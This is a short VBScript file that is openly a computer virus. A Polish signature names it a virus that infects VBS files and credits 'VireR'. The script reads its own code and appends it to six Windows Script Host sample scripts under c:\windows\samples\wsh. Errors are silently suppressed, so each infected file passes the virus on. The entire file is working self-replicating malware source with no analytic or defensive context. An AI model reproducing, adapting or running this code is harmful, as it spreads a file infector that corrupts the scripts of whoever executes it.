option explicit
dim ofso,sygnatura
dim nosiciel,kodnosic,skrypt,plik,chart,excel,network,registry,shortcut,showvar
chart="c:\windows\samples\wsh\chart.vbs"
excel="c:\windows\samples\wsh\excel.vbs"
network="c:\windows\samples\wsh\Network.vbs"
registry="c:\windows\samples\wsh\registry.vbs"
shortcut="c:\windows\samples\wsh\shortcut.vbs"
showvar="c:\windows\samples\wsh\showvar.vbs"
sygnatura="virus Œmieszny infekujacy pliki vbs w folderze c:\windows\samples by VireR"

on error resume next
set ofso=createobject("scripting.filesystemobject")
nosiciel=wscript.scriptfullname
set skrypt=ofso.opentextfile(nosiciel,1)
kodnosic=skrypt.readall
skrypt.close
call infect(chart)
call infect(excel)
call infect(network)
call infect(registry)
call infect(shortcut)
call infect(showvar)


sub infect(nazwa)
on error resume next
ofso.getfile(nazwa)
if ofso.fileexists(nazwa)=true then
if err=0 then
set plik=ofso.opentextfile(nazwa,8)
plik.write(kodnosic)
plik.close
end if
end if
end sub